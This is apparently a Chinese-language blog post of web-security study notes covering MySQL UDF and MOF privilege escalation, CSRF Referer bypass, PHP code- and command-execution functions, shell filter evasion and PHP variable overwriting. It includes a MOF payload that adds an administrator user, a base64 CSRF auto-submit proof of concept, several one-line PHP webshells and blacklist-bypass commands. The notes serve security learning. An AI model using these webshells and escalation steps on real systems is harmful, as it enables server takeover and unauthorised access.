---
title: Web安全知识点
date: 2018-03-11 18:13:23
tags:
		- 
categories:
		- Web安全资料汇集
---

三人行必有我师。

<!-- more -->

#### UDF提权原理

[MySQL之UDF提权原理及实现](http://www.secist.com/archives/618.html)

提权原理：利用了`root`高权限，创建带有调用cmd的函数的`udf.dll`动态链接库。这样一来就可以利用`system`权限进行提权操作了。

__数据库版本 5.0以下的__

win2000  将udf.dll 文件导出到 <font color=red>C:\Winnt\udf.dll</font>下

win2003 将udf.dll 文件导出到 <font color=red>C:\Windows\udf.dll </font>下

__数据库版本为 5.1 以上的__

我们则需要将 dll 文件导出到 mysql 安装目录的 `lib\plugin\` 下，才能创建自定义函数。注：如果没有 plugin 目录，我们可以进行手动创建

通过大马进行`MYSQL`提权，或者使用`uef.php`此类的提权工具进行提权。

[UDF提权原理](https://www.404sec.com/7815.html)

`UDF` -- `User Defined Function`用户自定义函数，支持用户自定义函数的功能。

Mysql有很多的内置函数提供给开发者，包括字符串函数、数值函数、日期和时间函数等，给开发人员带来了很多方便。虽然`Mysql`的内置函数丰富，但是毕竟不能满足所有人的需要，有时候我们需要对表中的数据进行一些处理，而内置函数不能满足需要的时候，就需要对MySQL进行一些扩展，这就是可以自行添加`MySQL`的`UDF`。

需要对Mysql数据库有足够高的权限就能为其添加自定义的函数。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-2/68235578.jpg)

这里的自定义函数要以dll形式写成mysql的插件，提供给mysql来使用。

[手把手教你写mysql的udf](https://www.404sec.com/7817.html)

学会编写Mysql的用户自定义函数，然后编写提权的函数，调用cmd命令的函数。


[高版本MySQL之UDF提权](https://xz.aliyun.com/t/2199)

[翻译 MySQL UDF Exploitation](https://xz.aliyun.com/t/2167)

[Linux MySQL Udf 提权](http://www.91ri.org/16540.html)


#### MOF提权

[Mof提权原理及实现](http://www.secist.com/archives/608.html)

利用`c:/windows/system32/wbem/mof/`目录下的`nullevt.mof`文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的`cmd`命令使其被执行。

首先将我们的`mof`提取脚本上传到可读可写目录下。接着选择`MySQL`提权项，输入已经获取的`MySQL`账户信息，并执行命令。

	select load_file(“C:/php/APMServ5.2.6/www/htdocs/1.mof”) into dumpfile “c:/windows/system32/wbem/mof/nullevt.mof”


在`mof`文件中，写入恶意代码，一般是添加用户，添加进管理员组。

	ScriptText = 
	    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"; 
	}; 

首先把`mof`文件上传，然后进行替换原始的。


__版本问题__

[windows 2008 如何来执行mof?](https://www.t00ls.net/viewthread.php?tid=30066&highlight=mof)

mof文件，在2003中直接把mof文件拖到wbem下的mof文件中，系统就会自动加载。win2008以后系统就不支持这种方式了，那么2008中是如何来加载mof文件的呢？


	03以上必须要手动编译mof，用api或mofcomp
	%windir%\system32\wbem\mofcomp -N:root\subscription mof.mof
	都需要管理员权限才能执行。
	想达到任意写转任意代码执行的效果的话，换个方式吧，08上还是有个两三种的。


[[【转载】] php写的mof提权带回显带清楚命令版本](https://www.t00ls.net/viewthread.php?tid=24989&highlight=mof)

#### CSRF绕过 Referer

[CSRF - 空Referer绕过](http://www.cnblogs.com/huangjacky/p/4109096.html)

[CSRF 花式绕过Referer技巧](https://www.ohlinge.cn/web/csrf_referer.html)

__Referer为空的情况下__

常见的协议：`ftp://,http://,https://,file://,javascript:,data`

在本地打开一个HTML页面，这个时候浏览器地址栏是`file://`开头，如果这个HTML页面向任何http站点提交请求的话，这些Referer都是空的，接下来用data:协议来构造一个自动提交的CSRF攻击。

假设 `http://a.b.com/d `这个接口存在空Referer绕过的CSRF。POC

	<html>
    <body>
       <iframe src="data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==">
    </doby>
	</html>


iframe的src为

	<form method=post action=http://a.b.com/d><input type=text name='id' value='123'/></form><script>document.forms[0].submit();</script>




__判断Referer是某域名下绕过__

比如找到的`csrf`验证的`referer`是`xxx.com`。验证referer可以找个二级域名`*.xx.com`。


[利用Window.Opener绕过CSRF保护](http://www.freebuf.com/vuls/83398.html)

`CSRF`防护方法

	1：检查 Referer
	2：基于表单的随机 Token
	3：基于Cookie的随机Token
	4：验证码


####  XSS盲打到内网

好洞，学习。

[锐捷某系列网关产品从XSS盲打到完全控制网关并留下后门](https://wooyun.shuimugan.com/bug/view?bug_no=059105)

[如何XSS自动化入侵内网](http://www.freebuf.com/articles/web/103097.html)


[我是如何通过一个 XSS 探测搜狐内网扫描内网并且蠕动到前台的！(附带各种 POC)](https://wooyun.shuimugan.com/bug/view?bug_no=76685)


[点我一个链接就自动化入侵你的内网](https://phpinfo.me/2016/07/28/1285.html)


[内网渗透一：利用Xss漏洞和IE漏洞进入内网](http://bobao.360.cn/learning/detail/300.html)

[跨站的艺术：XSS Fuzzing 的技巧](https://cloud.tencent.com/developer/article/1004753)


#### PHP代码执行函数

参考下面的文章，动手练习一下。

[PHP代码命令注入小结](http://www.freebuf.com/column/166385.html)

[PHP代码执行函数总结](http://www.cnblogs.com/xiaozi/p/7834367.html)


__assert__

	// assert和eval 类似
	<?php
	assert($_REQUEST[cmd]);
	?>

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-12/10386748.jpg)

__preg_replace()__

[一个PHP正则相关的“经典漏洞”](https://www.cdxy.me/?p=756)

	mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )

	搜索subject中匹配pattern的部分， 以replacement进行替换。


`preg_replace`函数是一个正则表达式的搜索和替换，因为存在危险的`/e`修饰符，使得`preg_replace()`将`replacement`参数当作`php`代码。
	
	<?php
	// cmd=phpinfo()
	@preg_replace("/abc/e",$_REQUEST['cmd'],"abcd");
	
	?>


__create_function__

`create_function`主要用来创建匿名函数，如果没有对参数进行过滤，攻击者可以构造特殊字符串给`create_function()`执行任意命令

	string create_function ( string $args , string $code )

[解析create_function() && 复现wp](https://paper.seebug.org/94/)

[PHP create_function()注入命令执行漏洞](https://www.t00ls.net/articles-20774.html)

[PHP create_function()代码注入](http://blog.51cto.com/lovexm/1743442)

	<?php
	// ?cmd=phpinfo();  //必须有分号
	$func = create_function('',$_REQUEST['cmd']);
	$func();
	?>

__array_map()__

[array_map](https://secure.php.net/manual/zh/function.array-map.php)

	array array_map ( callable $callback , array $array1 [, array $... ] )
	array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。

`array_map()`函数将用户自定义函数作用到数组的每个值上，并返回用户自定义函数作用后带有新值的数组。

回调函数接受的参数数目应该和传递给`array_map()`函数的数组数目一致。

	<?php
	//?func=system&cmd=whoami
	
	$func = $_GET['func']; // $func 定义为system函数
	$cmd = $_GET['cmd'];
	$array[0] = $cmd;
	$new_array = array_map($func,$array);
	
	?>

应用

	http://192.168.86.194:9000/code/array_map.php?func=system&cmd=whoami
	administrator 

__call_user_func()/call_func_array()__

`call_user_func` 把第一个参数作为回调函数调用，其余参数是回调函数的参数。

	<?php
	// ?cmd=phpinfo()
	@call_user_func(assert,$_GET['cmd']);
	?>


`call_user_func_array` 调用回调函数，并把一个数组参数作为回调函数的参数。


	<?php
	// ?cmd=phpinfo()
	$cmd = $_GET['cmd'];
	$array[0] = $cmd;
	call_user_func_array("assert",$array);
	?>


__array_filter()__

	array_filter — 用回调函数过滤数组中的单元

	array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )

依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。

	<?php
	// ?func=system&cmd=whoami
	$cmd = $_GET['cmd'];
	$array1 = array($cmd);
	$func = $_GET['func'];
	array_filter($array1,$func);
	
	?>

__usort()、uasort()__

usort — 使用用户自定义的比较函数对数组中的值进行排序

	bool usort ( array &$array , callable $value_compare_func )

本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。


__文件操作函数__

	file_put_contents — 将一个字符串写入文件
	　　fputs() 函数写入文件

代码

	<?php
	$test = '<?php  eval($_POST[c]); ?>';
	file_put_contents('shell.php',$test);
	?>



	<?php  fputs(fopen('shell1.php','w'),'<?php eval($_POST[c]);?>') ?>

__动态函数__

PHP函数直接由字符串拼接

	<?php
	//?a=assert&b=phpinfo()
	$_GET['a']($_GET['b']);
	?>


#### PHP 命令执行函数

PHP代码执行和命令执行的区别。个人认为代码执行主要是执行`PHP`的代码，比如`phpinfo()`，而命令执行是调用了系统的`shell`，比如`whoami`之类的系统命令。

[Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa)

[Command Injection/Shell Injection](https://www.exploit-db.com/docs/english/42593-command-injection---shell-injection.pdf)

[命令执行漏洞](http://wyb0.com/posts/command-execution-vulnerabilities/)

[浅谈CTF中命令执行与绕过的小技巧 ](http://www.freebuf.com/articles/web/137923.html)

[命令执行和绕过的一些小技巧](https://www.anquanke.com/post/id/84920)

[探究PHP命令执行函数原理](https://www.t00ls.net/thread-45328-1-1.html)

__Command Execution__


	exec           - Returns last line of commands output
	passthru       - Passes commands output directly to the browser
	system         - Passes commands output directly to the browser and returns last line
	shell_exec     - Returns commands output
	`` (backticks) - Same as shell_exec()
	popen          - Opens read or write pipe to process of a command
	proc_open      - Similar to popen() but greater degree of control
	pcntl_exec     - Executes a program


>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等。当用户能控制执行函数中的参数时，就可以将恶意命令拼接到参数中，造成命令执行攻击。

__system__

	<?php
	// cmd=whoami
	$arg = $_GET['cmd'];
	if($arg){
	    system("$arg");
	}
	?>


[命令执行和绕过的一些小技巧](https://www.anquanke.com/post/id/84920)

__黑名单__

使用`$参数`，进行拼接。`ls` ==

	root@kali:/tmp/shell# echo sec_note > test
	root@kali:/tmp/shell# ls
	test
	root@kali:/tmp/shell# a=l;b=s;$a$b
	test
	root@kali:/tmp/shell# a=c;b=at;c=te;d=st;$a$b ${c}${d}
	sec_note
	root@kali:/tmp/shell# 


__绕过空格__

	root@kali:/tmp/shell# cat<>test
	sec_note
	root@kali:/tmp/shell# cat${IFS}test
	sec_note
	root@kali:/tmp/shell# cat${IS}test
	bash: cattest: command not found



#### PHP 变量覆盖

[变量覆盖漏洞](http://www.cnblogs.com/xiaozi/p/7768580.html)

[变量覆盖漏洞](http://www.freebuf.com/column/150731.html)

[变量覆盖](https://blog.csdn.net/niexinming/article/details/52637773)

>用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序其他功能来实现完整的攻击。

[使用 Register Globals](https://secure.php.net/manual/zh/security.globals.php)

	Warning
	本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。


测试`PHP 5.2.17` `php.ini`

	register_globals = On


测试

register_globals = Off

	<?php
	// ?id=1
	echo "Register_globals: ".(int)ini_get("register_globals")."<br/>";
	echo '$_GET["id"] :'.$_GET['id']."<br/>";
	echo '$id :'.$id;
	
	?>


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-17/5929394.jpg)

register_globals = On

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-17/84182679.jpg)



当`register_globals = On`，下面的`$id`可以获取到值。

__$$导致变量覆盖__

`PHP`的引用允许用两个变量来指向同一个内容。




__[extract](https://secure.php.net/manual/zh/function.extract.php)__

extract — 从数组中将变量导入到当前的符号表

	int extract ( array &$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )

本函数用来将变量从数组中导入到当前的符号表中。

检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。

	<?php
	$size = "large";
	$var_array = array("color" => "blue",
	                    "size" => "medium",
	                    "shape" => "sphere");
	                    
	extract($var_array,EXTR_SKIP,"wddx");
	echo "$color,$size,$shape,$wddx_size\n";                    
	    
	
	?>


EXTR_SKIP
如果有冲突，不覆盖已有的变量。`size`还是原来的值。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-17/41816108.jpg)


	<?php
	$id=1;
	extract($_GET);
	echo $id;
	?>

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-17/67315107.jpg)

[parse_str](https://secure.php.net/manual/zh/function.parse-str.php)

parse_str — 将字符串解析成多个变量

	<?php
	$str = "first=value&arr[]=PHP+JAVA&arr[]=python";
	parse_str($str,$output);
	echo $output['first'] ."<br/>";
	echo $output['arr'][0] ."<br/>";
	echo $output['arr'][1];
	?>


结果

	value
	PHP JAVA
	python


__[import_request_variables](https://secure.php.net/manual/zh/function.import-request-variables.php)__

import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中

	bool import_request_variables ( string $types [, string $prefix ] )



将 `GET／POST／Cookie` 变量导入到全局作用域中。如果你禁止了 `register_globals`，但又想用到一些全局变量，那么此函数就很有用。



	<?php
	$b = 1;
	import_request_variables('GP');
	print_r($b);
	?>


	http://192.168.86.194:9000/0411/4.php?b=1233
	// 结果 1233


[变量覆盖漏洞](http://www.freebuf.com/column/150731.html)

>用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。
>漏洞出现情况。 $$ 使用不当、extrace()函数使用不当、parse_str()函数使用不当、import_request_variables()使用不当、开启了全局变量注册等。

[Difference Between $var and $$var in PHP](https://www.phptpoint.com/php-dolor-and-double-dolor-variables/)

>$$var 使用名称为 $var 的值的变量的值
>这意味着 $$var 被称为引用变量，其中 $var 是普通变量
>它允许你有一个变量的变量，程序可以创建变量的名称，就像创建其他字符串一样。

__eg1__

	<?php
	$name = "php";
	$$name = "java";
	echo $name."<br/>";
	echo $$name."<br/>";
	echo $php;  // java  $$name=> $($name)->$php = "java"
	?>


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-17/72963009.jpg)

$$导致的变量覆盖和`foreach`结合。使用`foreach`来遍历数组的值，然后将获取的数组键作为变量，数组中的键值作为变量的值。出现了变量覆盖漏洞。

	<?php
	
	//?name=test
	$name = ' secnote';
	foreach($_GET as $key => $value)
	
	$$key = $value;
	var_dump($key)";   //string(4) "name" test
	var_dump($value)";   // string(4) "test" test
	var_dump($$key);   // string(4) "test" 
	echo $name;         // test
	
	
	?>


[由MetInfo 深入理解PHP变量覆盖漏洞](https://mp.weixin.qq.com/s/I7tEDv12e65KI93TCXN8Ug) 
